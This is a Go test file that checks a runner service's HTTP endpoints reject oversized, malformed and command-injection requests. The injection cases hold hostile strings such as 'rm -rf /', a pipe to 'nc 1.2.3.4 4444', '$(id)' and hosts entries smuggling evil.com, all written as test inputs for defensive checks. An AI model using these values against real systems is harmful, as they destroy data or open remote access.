package services

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestAdversarial_RunnerOversizedPayloads(t *testing.T) {
	mux := NewRunnerMux()

	endpoints := []string{
		"/v1/systemctl",
		"/v1/package",
		"/v1/self-update",
		"/v1/sandbox",
		"/v1/hosts",
		"/v1/network",
		"/v1/quota",
	}

	for _, ep := range endpoints {
		t.Run("Oversized 4097 bytes on "+ep, func(t *testing.T) {
			// Construct valid JSON but pad with spaces to 4097 bytes (> 4096 limit)
			padding := strings.Repeat(" ", 4080)
			payload := fmt.Sprintf(`{"service":"radarr"%s}`, padding)
			if len(payload) <= 4096 {
				payload += strings.Repeat(" ", 4097-len(payload))
			}

			w := httptest.NewRecorder()
			req := httptest.NewRequest(http.MethodPost, ep, bytes.NewBufferString(payload))
			req.Header.Set("Content-Type", "application/json")
			mux.ServeHTTP(w, req)

			// http.MaxBytesReader causes json.Decode to fail -> HTTP 400 Bad Request
			if w.Code != http.StatusBadRequest {
				t.Fatalf("expected HTTP 400 for 4097-byte payload on %s, got HTTP %d: %s", ep, w.Code, w.Body.String())
			}
		})

		t.Run("Massive 64KB payload on "+ep, func(t *testing.T) {
			padding := strings.Repeat("A", 64*1024)
			payload := fmt.Sprintf(`{"garbage":"%s"}`, padding)

			w := httptest.NewRecorder()
			req := httptest.NewRequest(http.MethodPost, ep, bytes.NewBufferString(payload))
			req.Header.Set("Content-Type", "application/json")
			mux.ServeHTTP(w, req)

			if w.Code != http.StatusBadRequest {
				t.Fatalf("expected HTTP 400 for 64KB payload on %s, got HTTP %d", ep, w.Code)
			}
		})
	}
}

func TestAdversarial_RunnerMalformedPayloads(t *testing.T) {
	mux := NewRunnerMux()

	endpoints := []string{
		"/v1/systemctl",
		"/v1/package",
		"/v1/self-update",
		"/v1/sandbox",
		"/v1/hosts",
		"/v1/network",
		"/v1/quota",
	}

	malformedBodies := []struct {
		name string
		body string
	}{
		{"Empty body", ""},
		{"Truncated JSON", `{"service": "radarr"`},
		{"Invalid JSON syntax", `{invalid_json: true}`},
		{"Non-object array", `[1, 2, 3]`},
		{"Raw non-JSON string", `PLAIN_TEXT_PAYLOAD`},
		{"Null byte in body", "{\"service\": \"radarr\x00\"}"},
	}

	for _, ep := range endpoints {
		for _, mb := range malformedBodies {
			t.Run(fmt.Sprintf("%s on %s", mb.name, ep), func(t *testing.T) {
				w := httptest.NewRecorder()
				req := httptest.NewRequest(http.MethodPost, ep, strings.NewReader(mb.body))
				req.Header.Set("Content-Type", "application/json")
				mux.ServeHTTP(w, req)

				// Must fail gracefully with 400 Bad Request (never 500 panic)
				if w.Code != http.StatusBadRequest {
					t.Fatalf("expected HTTP 400 for %s on %s, got HTTP %d: %s", mb.name, ep, w.Code, w.Body.String())
				}
			})
		}
	}
}

func TestAdversarial_RunnerCommandInjectionHardening(t *testing.T) {
	mux := NewRunnerMux()

	// 1. Systemctl: Shell metacharacters in service name
	injections := []string{
		"radarr; rm -rf /",
		"radarr && reboot",
		"radarr | nc 1.2.3.4 4444",
		"radarr`id`",
		"radarr$(id)",
		"radarr\nreboot",
		"radarr\r\nreboot",
	}
	for _, inj := range injections {
		t.Run("systemctl injection: "+inj, func(t *testing.T) {
			b, _ := json.Marshal(SystemctlRequest{Service: inj, Action: "restart"})
			w := httptest.NewRecorder()
			req := httptest.NewRequest(http.MethodPost, "/v1/systemctl", bytes.NewReader(b))
			mux.ServeHTTP(w, req)
			if w.Code != http.StatusBadRequest {
				t.Fatalf("expected 400 for injection in systemctl service, got %d: %s", w.Code, w.Body.String())
			}
		})
	}

	// 2. Hosts: Domain format validation
	badDomains := []string{
		"evil.com",
		"radarr.aether.local; touch /tmp/pwned",
		"radarr.aether.local\n1.2.3.4 evil.com",
		"radarr.aether.local\tbad",
		" radarr.aether.local",
		strings.Repeat("a", 254) + ".aether.local", // > 253 chars
	}
	for _, bd := range badDomains {
		t.Run("hosts domain: "+bd, func(t *testing.T) {
			b, _ := json.Marshal(HostsRunnerRequest{Domains: []string{bd}})
			w := httptest.NewRecorder()
			req := httptest.NewRequest(http.MethodPost, "/v1/hosts", bytes.NewReader(b))
			mux.ServeHTTP(w, req)
			if w.Code != http.StatusBadRequest {
				t.Fatalf("expected 400 for invalid hosts domain, got %d: %s", w.Code, w.Body.String())
			}
		})
	}

	// 3. Network: Disallowed action and route injection
	badNetRequests := []NetworkRunnerRequest{
		{Action: "rm_rf_iptables"},
		{Action: "wg_add_peer", PublicKey: "invalid_short_key"},
		{Action: "wg_add_peer", PublicKey: "validkey123456789012345678901234567890123456789=", AllowedIPs: "10.0.0.1; rm -rf /"},
		{Action: "tailscale_set_routes", Routes: []string{"10.0.0.0/24; rm -rf /"}},
		{Action: "tailscale_set_routes", Routes: []string{}}, // empty routes
	}
	for i, bnr := range badNetRequests {
		t.Run(fmt.Sprintf("network injection case %d", i), func(t *testing.T) {
			b, _ := json.Marshal(bnr)
			w := httptest.NewRecorder()
			req := httptest.NewRequest(http.MethodPost, "/v1/network", bytes.NewReader(b))
			mux.ServeHTTP(w, req)
			// Either rejected at validation (400) or fails safely (not 200)
			if w.Code == http.StatusOK {
				t.Fatalf("expected non-200 for malicious network request %+v, got %d", bnr, w.Code)
			}
		})
	}

	// 4. Quota: Username and Size injections
	badQuotas := []QuotaRunnerRequest{
		{Username: "admin; id", Size: "10G"},
		{Username: "admin", Size: "10G; rm -rf /"},
		{Username: "root\nadmin", Size: "10G"},
		{Username: "admin", Size: "unlimited"},
	}
	for _, bq := range badQuotas {
		t.Run(fmt.Sprintf("quota injection: %s %s", bq.Username, bq.Size), func(t *testing.T) {
			b, _ := json.Marshal(bq)
			w := httptest.NewRecorder()
			req := httptest.NewRequest(http.MethodPost, "/v1/quota", bytes.NewReader(b))
			mux.ServeHTTP(w, req)
			if w.Code != http.StatusBadRequest {
				t.Fatalf("expected 400 for malicious quota, got %d: %s", w.Code, w.Body.String())
			}
		})
	}
}

func TestAdversarial_RunnerMethodNotAllowed(t *testing.T) {
	mux := NewRunnerMux()
	endpoints := []string{"/v1/systemctl", "/v1/package", "/v1/self-update", "/v1/sandbox", "/v1/hosts", "/v1/network", "/v1/quota"}
	disallowedMethods := []string{http.MethodGet, http.MethodPut, http.MethodDelete, http.MethodPatch}

	for _, ep := range endpoints {
		for _, method := range disallowedMethods {
			w := httptest.NewRecorder()
			req := httptest.NewRequest(method, ep, nil)
			mux.ServeHTTP(w, req)
			if w.Code != http.StatusMethodNotAllowed {
				t.Fatalf("expected 405 Method Not Allowed for %s %s, got %d", method, ep, w.Code)
			}
		}
	}
}
